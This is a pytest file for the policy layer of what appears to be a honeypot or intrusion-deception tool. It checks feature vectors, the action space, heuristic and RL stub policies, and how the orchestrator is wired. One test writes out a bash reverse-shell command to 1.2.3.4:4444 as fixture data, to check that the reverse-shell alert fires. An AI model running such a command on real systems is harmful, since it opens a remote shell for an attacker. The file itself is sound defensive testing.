"""Unit tests for the V2 policy scaffold."""
import pytest

from plenith.policy import (
    ACTION_SPACE, OBSERVATION_FEATURES,
    HeuristicPolicy, RLPolicyStub, Policy,
    build_policy, vectorize,
)
from plenith.session import Session

class TestObservationSpace:
    def test_features_are_ordered_and_unique(self):
        names = [f["name"] for f in OBSERVATION_FEATURES]
        assert len(names) == len(set(names)), "duplicate feature names"

    def test_every_feature_has_type(self):
        for f in OBSERVATION_FEATURES:
            assert f["type"] in {"bool", "count", "scalar"}, f

class TestActionSpace:
    def test_noop_is_id_zero(self):
        assert ACTION_SPACE[0] == "noop"

    def test_no_duplicate_actions(self):
        assert len(ACTION_SPACE) == len(set(ACTION_SPACE))

    def test_includes_all_alerts(self):
        # Sanity: every alert_* action the heuristics file emits is in the space
        for a in ["alert_reverse_shell", "alert_ssh_persistence",
                  "alert_credential_exfil", "alert_dns_exfil",
                  "alert_lateral_decoy", "alert_log_tampering",
                  "alert_honeytoken_tamper", "alert_credential_search",
                  "alert_payload_staging", "alert_decoy_swallowed"]:
            assert a in ACTION_SPACE, f"missing {a}"

class TestVectorize:
    def test_baseline_vector_is_all_zeros_for_fresh_session(self, persona_jdoe):
        s = Session("jdoe", "127.0.0.1", persona_jdoe)
        v = vectorize(s)
        assert len(v) == len(OBSERVATION_FEATURES)
        # Most features are 0 for a brand-new session (connection_count = 1)
        assert sum(v) <= 5  # accounting for connection_count + time

    def test_vector_responds_to_observations(self, persona_jdoe):
        s = Session("jdoe", "127.0.0.1", persona_jdoe)
        s.observed["ran_sudo"] = True
        s.observed["payload_drops"].add("/tmp/x")
        s.observed["payload_drops"].add("/tmp/y")
        v = vectorize(s)
        idx_ran_sudo = [f["name"] for f in OBSERVATION_FEATURES].index("ran_sudo")
        assert v[idx_ran_sudo] == 1.0
        idx_drops = [f["name"] for f in OBSERVATION_FEATURES].index("n_payload_drops")
        assert v[idx_drops] == 2.0

    def test_count_features_are_clamped(self, persona_jdoe):
        s = Session("jdoe", "127.0.0.1", persona_jdoe)
        for i in range(100):
            s.observed["payload_drops"].add(f"/tmp/f{i}")
        v = vectorize(s)
        idx = [f["name"] for f in OBSERVATION_FEATURES].index("n_payload_drops")
        max_v = next(f for f in OBSERVATION_FEATURES if f["name"] == "n_payload_drops")["max"]
        assert v[idx] == float(max_v)

class TestHeuristicPolicy:
    def test_engine_name(self):
        p = HeuristicPolicy()
        assert p.engine_name == "heuristic"

    def test_decide_returns_same_as_heuristics(self, persona_jdoe):
        s = Session("jdoe", "127.0.0.1", persona_jdoe)
        s.observed["ssh_persistence_attempt"] = True
        from plenith.heuristics import decide_action
        # Reset alerted flag so we're comparing apples to apples
        s2 = Session("jdoe", "127.0.0.1", persona_jdoe)
        s2.observed["ssh_persistence_attempt"] = True
        a_via_policy = HeuristicPolicy().decide(s)
        a_via_heuristics = decide_action(s2)
        assert a_via_policy["action"] == a_via_heuristics["action"]
        assert a_via_policy["severity"] == a_via_heuristics["severity"]

    def test_returns_none_when_no_rule_fires(self, persona_jdoe):
        s = Session("jdoe", "127.0.0.1", persona_jdoe)
        assert HeuristicPolicy().decide(s) is None

class TestRLPolicyStub:
    def test_engine_name(self):
        assert RLPolicyStub().engine_name == "rl"

    def test_falls_back_to_heuristic_until_model_wired(self, persona_jdoe):
        s = Session("jdoe", "127.0.0.1", persona_jdoe)
        s.observed["reverse_shell_attempted"] = True
        s.observed["reverse_shell_command"] = "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
        out = RLPolicyStub().decide(s)
        # Stub mirrors heuristic; reverse-shell alert should fire
        assert out is not None
        assert out["action"] == "alert_reverse_shell"

class TestBuildPolicy:
    def test_default_is_heuristic(self):
        p = build_policy(None)
        assert isinstance(p, HeuristicPolicy)

    def test_engine_heuristic(self):
        p = build_policy({"engine": "heuristic"})
        assert isinstance(p, HeuristicPolicy)

    def test_engine_rl(self):
        p = build_policy({"engine": "rl"})
        assert isinstance(p, RLPolicyStub)

    def test_unknown_engine_falls_back(self):
        p = build_policy({"engine": "definitely-not-a-real-engine"})
        assert isinstance(p, HeuristicPolicy)

class TestOrchestratorWithPolicy:
    async def test_default_orchestrator_uses_heuristic(self, orchestrator):
        assert isinstance(orchestrator.policy, HeuristicPolicy)

    async def test_orchestrator_with_explicit_policy(self, fake_llm, cache, sim_bot):
        from plenith.orchestrator import Orchestrator
        pol = RLPolicyStub()
        o = Orchestrator(fake_llm, cache, sim_bot=sim_bot, policy=pol)
        assert o.policy is pol
